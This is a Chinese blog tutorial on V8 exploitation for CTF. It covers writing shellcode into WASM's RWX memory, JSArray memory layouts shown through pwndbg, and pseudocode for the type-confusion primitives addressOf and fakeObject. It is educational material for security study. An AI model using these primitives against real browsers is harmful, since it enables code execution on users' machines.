<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Chose me  JavaScript-V8 /Chapter2-通用利用链 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Chose me  JavaScript-V8 /Chapter2-通用利用链</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-07-06T13:22:24.000Z" id="date"> 2022-07-06</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-12-29T04:50:34.990Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>首先需要明确的是，通过 v8 漏洞，我们需要达成什么样的目的？</p>
<p>一般在做 CTF 的时候，往往希望让远程执行 system(“&#x2F;bin&#x2F;sh”) 或者 execve(“&#x2F;bin&#x2F;sh”,0,0) 又或者 ORW ，除了最后一个外，往往一般是希望能够做到远程命令执行，所以一般通过 v8 漏洞也希望能够做到这一点。一般来说，我们希望能往里面写入shellcode，毕竟栈溢出之类的操作在 v8 下似乎不太可能完成。</p>
<h2 id="WASM的利用"><a href="#WASM的利用" class="headerlink" title="WASM的利用"></a>WASM的利用</h2><p>既然要写 shellcode，就需要保证内存中存在可读可写可执行的内存段了。在没有特殊需求的情况下，程序不可能特地开辟一块这样的内存段供用户使用，但在如今支持 WASM(WebAssembly) 的浏览器版本中，一般都需要开辟一块这样的内存用以执行汇编指令，回想上一节给出的测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%SystemBreak();<br>var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);<br><br>var wasmModule = new WebAssembly.Module(wasmCode);<br>var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);<br>var f = wasmInstance.exports.main;<br>%DebugPrint(f);<br>%DebugPrint(wasmInstance);<br>%SystemBreak();<br></code></pre></td></tr></table></figure>

<p>此处调用了 WebAssembly 模块为 WASM 创建专用的内存段，当我们执行到第二个断点后，通过 “vmmap” 指令可以发现内存中多了一个特殊的内存段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; vmmap<br>    0x226817c0d000     0x226817c0e000 rwxp     1000 0      [anon_226817c0d]<br></code></pre></td></tr></table></figure>

<p>那么现在这段内存就能够为我们所用了。如果我们向其中写入 shellcode ，日后在执行 WASM 时就会转而执行我们写入的攻击代码了</p>
<p>由于 v8 一般都是开启了所有保护的，为此我们需要像 CTF 题那样先泄露地址，然后再达成任意地址写</p>
<blockquote>
<p>这里会有一个疑问，既然是浏览器，难道不能自己构建WASM直接拿下吗？怎么还需要自己去写 shellcode？</p>
<p>结论是，WASM不允许执行需要系统调用才能完成的操作。<br>更准确的说，WASM并不是汇编代码，而是 v8 会根据这段数据生成一段汇编然后加载到内存段中去执行，而检查该代码是否存在系统调用就发生在这一步。<br>如果通过构造合法的WASM使其创造内存段，然后在之后的操作里写入非法的 Shellcode，就能够完成利用了。</p>
</blockquote>
<h2 id="高版本的变化"><a href="#高版本的变化" class="headerlink" title="高版本的变化"></a>高版本的变化</h2><p>这里有一个不得不说的问题是，在后来的版本中，不会再开辟这样的内存段了</p>
<p>我们可以先看看现在这个内存段中放入的数据是什么：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; vmmap<br>    0x226817c0d000     0x226817c0e000 rwxp     1000 0      [anon_226817c0d]<br><br>pwndbg&gt; tel 0x226817c0d000 20<br>00:0000│  0x226817c0d000 ◂— jmp    0x226817c0d480 /* 0xcccccc0000047be9 */<br>01:0008│  0x226817c0d008 ◂— int3    /* 0xcccccccccccccccc */<br>... ↓     6 skipped<br>08:0040│  0x226817c0d040 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */<br>09:0048│  0x226817c0d048 —▸ 0x55b126522940 (Builtins_ThrowWasmTrapUnreachable) ◂— mov    eax, 0x2d6<br>0a:0050│  0x226817c0d050 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */<br>0b:0058│  0x226817c0d058 —▸ 0x55b126522980 (Builtins_ThrowWasmTrapMemOutOfBounds) ◂— mov    eax, 0x2d8<br>0c:0060│  0x226817c0d060 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */<br>0d:0068│  0x226817c0d068 —▸ 0x55b1265229c0 (Builtins_ThrowWasmTrapUnalignedAccess) ◂— mov    eax, 0x2da<br>0e:0070│  0x226817c0d070 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */<br>0f:0078│  0x226817c0d078 —▸ 0x55b126522a00 (Builtins_ThrowWasmTrapDivByZero) ◂— mov    eax, 0x2dc<br>10:0080│  0x226817c0d080 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */<br>11:0088│  0x226817c0d088 —▸ 0x55b126522a40 (Builtins_ThrowWasmTrapDivUnrepresentable) ◂— mov    eax, 0x2de<br>12:0090│  0x226817c0d090 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */<br>13:0098│  0x226817c0d098 —▸ 0x55b126522a80 (Builtins_ThrowWasmTrapRemByZero) ◂— mov    eax, 0x2e0<br></code></pre></td></tr></table></figure>

<p>接下来笔者换到了截至至 2022.7.5 为止的最新版，我们再次重复之前的操作，看看这次 WASM 被放到了哪里：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; vmmap<br>     0x88d46808000      0x88d46809000 r-xp     1000 0      [anon_88d46808]<br><br>pwndbg&gt; tel 0x88d46808000 20<br>00:0000│  0x88d46808000 ◂— jmp    0x88d46808580<br>01:0008│  0x88d46808008 ◂— int3   <br>... ↓     6 skipped<br>08:0040│  0x88d46808040 ◂— jmp    qword ptr [rip + 2]<br>09:0048│  0x88d46808048 —▸ 0x7f7da298ca80 (Builtins_ThrowWasmTrapUnreachable) ◂— mov    eax, 0x31e<br>0a:0050│  0x88d46808050 ◂— jmp    qword ptr [rip + 2]<br>0b:0058│  0x88d46808058 —▸ 0x7f7da298cac0 (Builtins_ThrowWasmTrapMemOutOfBounds) ◂— mov    eax, 0x320<br>0c:0060│  0x88d46808060 ◂— jmp    qword ptr [rip + 2]<br>0d:0068│  0x88d46808068 —▸ 0x7f7da298cb00 (Builtins_ThrowWasmTrapUnalignedAccess) ◂— mov    eax, 0x322<br>0e:0070│  0x88d46808070 ◂— jmp    qword ptr [rip + 2]<br>0f:0078│  0x88d46808078 —▸ 0x7f7da298cb40 (Builtins_ThrowWasmTrapDivByZero) ◂— mov    eax, 0x324<br>10:0080│  0x88d46808080 ◂— jmp    qword ptr [rip + 2]<br>11:0088│  0x88d46808088 —▸ 0x7f7da298cb80 (Builtins_ThrowWasmTrapDivUnrepresentable) ◂— mov    eax, 0x326<br>12:0090│  0x88d46808090 ◂— jmp    qword ptr [rip + 2]<br>13:0098│  0x88d46808098 —▸ 0x7f7da298cbc0 (Builtins_ThrowWasmTrapRemByZero) ◂— mov    eax, 0x328<br>pwndbg&gt; <br></code></pre></td></tr></table></figure>

<p>这段新增的内存段内容是完全相同的，但区别在于，高版本下的 WASM 内存段不再可写了，只有可读可执行权限，似乎不再能这样攻击了</p>
<p>不过最开始的学习总归是从低版本向着高版本发展，接下来的内容也将以 “9.6.180.6” 版本为准，就像最开始学习 PWN 时从 Glibc2.23 开始那样(不过我估计有的大佬会从更低的版本开始……)</p>
<h2 id="数据储存方式"><a href="#数据储存方式" class="headerlink" title="数据储存方式"></a>数据储存方式</h2><p>用下面的脚本简单看看每个对象在内存中是如何储存的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//demo.js<br>%SystemBreak();<br>a= [2.1];<br>b=&#123;&quot;a&quot;:1&#125;;<br>c=[b];<br>d=[1,2,3];<br>%DebugPrint(a);<br>%DebugPrint(b);<br>%DebugPrint(c);<br>%DebugPrint(d);<br>%SystemBreak();<br></code></pre></td></tr></table></figure>

<h3 id="JSArray-a"><a href="#JSArray-a" class="headerlink" title="JSArray:a"></a>JSArray:a</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; job 0x31f3080499c9<br>0x31f3080499c9: [JSArray]<br> - map: 0x31f308203ae1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]<br> - prototype: 0x31f3081cc0e9 &lt;JSArray[0]&gt;<br> - elements: 0x31f3080499b9 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]<br> - length: 1<br> - properties: 0x31f30800222d &lt;FixedArray[0]&gt;<br> - All own properties (excluding elements): &#123;<br>    0x31f3080048f1: [String] in ReadOnlySpace: #length: 0x31f30814215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor<br> &#125;<br> - elements: 0x31f3080499b9 &lt;FixedDoubleArray[1]&gt; &#123;<br>           0: 2.1<br> &#125;<br>pwndbg&gt; x/8xw 0x31f3080499c9-1<br>0x31f3080499c8:    0x08203ae1  0x0800222d  0x080499b9  0x00000002<br>0x31f3080499d8:    0x08207aa1  0x0800222d  0x0800222d  0x00000002<br></code></pre></td></tr></table></figure>

<p>可以看出，一个 JSArray 在内存中的布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">32bit map addr  32bit properties addr  32bit elements addr  32bit length <br></code></pre></td></tr></table></figure>

<p>而其 elements 结构体的内存布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; job 0x31f3080499b9<br>0x31f3080499b9: [FixedDoubleArray]<br> - map: 0x31f308002a95 &lt;Map&gt;<br> - length: 1<br>           0: 2.1<br>pwndbg&gt; x/12xw 0x31f3080499b9-1<br>0x31f3080499b8:    0x08002a95  0x00000002  0xcccccccd  0x4000cccc<br>0x31f3080499c8:    0x08203ae1  0x0800222d  0x080499b9  0x00000002<br>0x31f3080499d8:    0x08207aa1  0x0800222d  0x0800222d  0x00000002<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">32bit map addr  32bit length  64bit value <br></code></pre></td></tr></table></figure>

<p>并且我们可以注意到，elements+0x10&#x3D;&amp;a，这说明这两个结构体在内存上相邻，如果 elements 的内容溢出了，就有可能覆盖 DoubleArray 结构体中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">32bit map addr  32bit length           64bit value                        elements<br>32bit map addr  32bit properties addr  32bit elements addr  32bit length jsarray<br></code></pre></td></tr></table></figure>

<blockquote>
<p>如上一节所说过的一样，这里的 length 也都被乘以二了</p>
</blockquote>
<h3 id="JS-OBJECT-TYPE-b"><a href="#JS-OBJECT-TYPE-b" class="headerlink" title="JS_OBJECT_TYPE:b"></a>JS_OBJECT_TYPE:b</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; job 0x31f3080499d9<br>0x31f3080499d9: [JS_OBJECT_TYPE]<br> - map: 0x31f308207aa1 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]<br> - prototype: 0x31f3081c41f5 &lt;Object map = 0x31f3082021b9&gt;<br> - elements: 0x31f30800222d &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]<br> - properties: 0x31f30800222d &lt;FixedArray[0]&gt;<br> - All own properties (excluding elements): &#123;<br>    0x31f308007b15: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object<br> &#125;<br>pwndbg&gt; x/8xw 0x31f3080499d9-1<br>0x31f3080499d8:    0x08207aa1  0x0800222d  0x0800222d  0x00000002<br>0x31f3080499e8:    0x08005c11  0x00010001  0x00000000  0x080021f9<br></code></pre></td></tr></table></figure>

<p>大致的内存结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">32bit map addr  32bit properties addr  32bit elements addr  32bit length <br></code></pre></td></tr></table></figure>

<p>但这个结构体的 elements 就没有和 JS_OBJECT_TYPE 相邻了，因此一般不存在可利用的地方</p>
<h3 id="JSArray-c"><a href="#JSArray-c" class="headerlink" title="JSArray:c"></a>JSArray:c</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; job 0x31f308049a11<br>0x31f308049a11: [JSArray]<br> - map: 0x31f308203b31 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]<br> - prototype: 0x31f3081cc0e9 &lt;JSArray[0]&gt;<br> - elements: 0x31f308049a05 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]<br> - length: 1<br> - properties: 0x31f30800222d &lt;FixedArray[0]&gt;<br> - All own properties (excluding elements): &#123;<br>    0x31f3080048f1: [String] in ReadOnlySpace: #length: 0x31f30814215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor<br> &#125;<br> - elements: 0x31f308049a05 &lt;FixedArray[1]&gt; &#123;<br>           0: 0x31f3080499d9 &lt;Object map = 0x31f308207aa1&gt;<br> &#125;<br>pwndbg&gt; job 0x31f308049a05<br>0x31f308049a05: [FixedArray]<br> - map: 0x31f308002205 &lt;Map&gt;<br> - length: 1<br>           0: 0x31f3080499d9 &lt;Object map = 0x31f308207aa1&gt;<br>pwndbg&gt; x/20xw 0x31f308049a05-1<br>0x31f308049a04:    0x08002205  0x00000002  0x080499d9  0x08203b31<br>0x31f308049a14:    0x0800222d  0x08049a05  0x00000002  0x00000000<br></code></pre></td></tr></table></figure>

<p>同为 JSArray 实体，因此内存布局与变量 a 相同，但不同的是，由于 a 中存放的是 double 类型的浮点数，其 value 占用 64bit，而变量 c 中存放的是地址，由于地址压缩的缘故，其 value 只占用 32bit，但同样与 JSArray 结构体在内存上相邻</p>
<h3 id="JSArray：d"><a href="#JSArray：d" class="headerlink" title="JSArray：d"></a>JSArray：d</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; job 0x18e808049a21<br>0x18e808049a21: [JSArray]<br> - map: 0x18e808203a41 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]<br> - prototype: 0x18e8081cc0e9 &lt;JSArray[0]&gt;<br> - elements: 0x18e8081d31ed &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]<br> - length: 3<br> - properties: 0x18e80800222d &lt;FixedArray[0]&gt;<br> - All own properties (excluding elements): &#123;<br>    0x18e8080048f1: [String] in ReadOnlySpace: #length: 0x18e80814215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor<br> &#125;<br> - elements: 0x18e8081d31ed &lt;FixedArray[3]&gt; &#123;<br>           0: 1<br>           1: 2<br>           2: 3<br> &#125;<br>pwndbg&gt; job 0x18e8081d31ed<br>0x18e8081d31ed: [FixedArray] in OldSpace<br> - map: 0x18e808002531 &lt;Map&gt;<br> - length: 3<br>           0: 1<br>           1: 2<br>           2: 3<br>pwndbg&gt; x/8xw 0x18e8081d31ed-1<br>0x18e8081d31ec:    0x08002531  0x00000006  0x00000002  0x00000004<br>0x18e8081d31fc:    0x00000006  0x08003259  0x00000000  0x081d31ed<br></code></pre></td></tr></table></figure>

<p>整数和浮点数数组没有什么差别，但它们在内存上不再相邻了，并且需要注意的是，其储存的数据也都被乘以二了，因此后续的利用中往往需要用浮点数去溢出，而不能直接了当的用整数数据溢出</p>
<h3 id="类型识别"><a href="#类型识别" class="headerlink" title="类型识别"></a>类型识别</h3><p>既然 a、c、d 三个变量都是 JSArray，肯定还需要一个结构用来区别其中储存的数据类型</p>
<p>我们尝试读取 a 和 d 两个数组的 map 结构体：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; job 0x18e808203a41<br>0x18e808203a41: [Map]<br> - type: JS_ARRAY_TYPE<br> - instance size: 16<br> - inobject properties: 0<br> - elements kind: PACKED_SMI_ELEMENTS<br> - unused property fields: 0<br> - enum length: invalid<br> - back pointer: 0x18e8080023b5 &lt;undefined&gt;<br> - prototype_validity cell: 0x18e808142405 &lt;Cell value= 1&gt;<br> - instance descriptors #1: 0x18e8081cc59d &lt;DescriptorArray[1]&gt;<br> - transitions #1: 0x18e8081cc5b9 &lt;TransitionArray[4]&gt;Transition array #1:<br>     0x18e80800524d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x18e808203ab9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;<br><br> - prototype: 0x18e8081cc0e9 &lt;JSArray[0]&gt;<br> - constructor: 0x18e8081cbe85 &lt;JSFunction Array (sfi = 0x18e80814adc9)&gt;<br> - dependent code: 0x18e8080021b9 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;<br> - construction counter: 0<br><br>pwndbg&gt; job 0x18e808203ae1<br>0x18e808203ae1: [Map]<br> - type: JS_ARRAY_TYPE<br> - instance size: 16<br> - inobject properties: 0<br> - elements kind: PACKED_DOUBLE_ELEMENTS<br> - unused property fields: 0<br> - enum length: invalid<br> - back pointer: 0x18e808203ab9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;<br> - prototype_validity cell: 0x18e808142405 &lt;Cell value= 1&gt;<br> - instance descriptors #1: 0x18e8081cc59d &lt;DescriptorArray[1]&gt;<br> - transitions #1: 0x18e8081cc5e9 &lt;TransitionArray[4]&gt;Transition array #1:<br>     0x18e80800524d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x18e808203b09 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;<br><br> - prototype: 0x18e8081cc0e9 &lt;JSArray[0]&gt;<br> - constructor: 0x18e8081cbe85 &lt;JSFunction Array (sfi = 0x18e80814adc9)&gt;<br> - dependent code: 0x18e8080021b9 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;<br> - construction counter: 0<br></code></pre></td></tr></table></figure>

<p>注意到 map 结构体中存在一项成员用以标注 elements 类型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">- elements kind: PACKED_DOUBLE_ELEMENTS<br></code></pre></td></tr></table></figure>

<p>并且两个都是 JS_ARRAY_TYPE，大多数数据都是相同的，因此可以直接将一个变量的 map 地址赋给另外一个变量，使得在读取值时错误解析数据类型，也就是所谓的“类型混淆”</p>
<p>类型混淆是有可能造成地址泄露的，可以考虑这样的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">float_arr= [2.1];<br>obj_arr=[float_arr];<br>%DebugPrint(a);<br>%DebugPrint(b);<br>%SystemBreak();<br></code></pre></td></tr></table></figure>

<p>正常访问 obj_arr[0] 会得到一个对象，但如果修改 obj_arr 的 map 为 float_arr 的 map，就会认为 obj_arr 是一个浮点数数组，那么此时访问 obj_arr[0] 就会得到对象 float_arr 的地址了</p>
<blockquote>
<p>注：对于没有接触过 Java 或 JavaScript 的读者来说可能会产生困惑，为什么需要通过这种麻烦的方式来获取地址，而不能像 C&#x2F;C++ 那样直接把对象地址打印出来？</p>
<p>简单来说，就是 JavaScript 不支持这种操作，它将一切视为对象或整数，消除了所谓“地址”的概念。<br>对 JavaScript 来说，例子中的 obj_arr[0] 储存的是一个 <strong>“对象”</strong> 而非 <strong>“地址”</strong>，访问该对象的返回值必然会是一个具体的 <strong>“对象”</strong>。(哪怕我们通过调试能够发现，它储存的就是一个地址，但在代码层面，我们没有获取该值的手段)</p>
</blockquote>
<h2 id="任意变量地址读"><a href="#任意变量地址读" class="headerlink" title="任意变量地址读"></a>任意变量地址读</h2><p>正如我们上一节所说，JavaScript 不允许我们直接读取某一个地址，但通过 “类型混淆” 的方法能够让 v8引擎 将一个地址误认为整数，并将其读出</p>
<h3 id="addressOf"><a href="#addressOf" class="headerlink" title="addressOf"></a>addressOf</h3><p>同上所述，我们讲这种类型混淆的读取地址方法称之为 “addressOf”</p>
<p>其一般的写法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//获取某个变量的地址<br>var other=&#123;&quot;a&quot;:1&#125;;<br>var obj_array=[other];<br>var double_array=[2.1];<br>var double_array_map=double_array.getMap();//假设我们有办法获取到其 map 值<br>function addressOf(target_var)<br>&#123;<br>    obj_array[0]=target_var;<br>    obj_array.setMap(double_array_map);//设置其 map 为浮点数数组的 map<br>    let target_var_addr=float_to_int(obj_array[0]);//读取obj_array[0]并将该浮点数转换为整型<br>    return target_var_addr;//此处返回的是 target_var 的对象结构体地址<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>该函数需要根据实际情况自行修改，示例代码仅做了一些逻辑抽象</p>
</blockquote>
<h3 id="fakeObject"><a href="#fakeObject" class="headerlink" title="fakeObject"></a>fakeObject</h3><p>与 addressOf 的步骤相反，将 float_arr 的 map 改为 obj_arr 的 map，使得在访问 float_arr[0] 时得到一个以 float_arr[0] 地址为起始的对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//将某个地址转换为对象<br>var other=&#123;&quot;a&quot;:1&#125;;<br>var obj_array=[other];<br>var double_array=[2.1];<br>var obj_array_map=obj_array.getMap();//假设我们有办法获取到其 map 值<br>function fakeObject(target_addr)<br>&#123;<br>    double_array[0]=int_to_float(target_addr+1n);//将地址加一以区分对象和数值<br>    double_array.setMap(obj_array_map);<br>    let fake_obj=double_array[0];<br>    return fake_obj;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>该函数需要根据实际情况自行修改，示例代码仅做了一些逻辑抽象</p>
</blockquote>
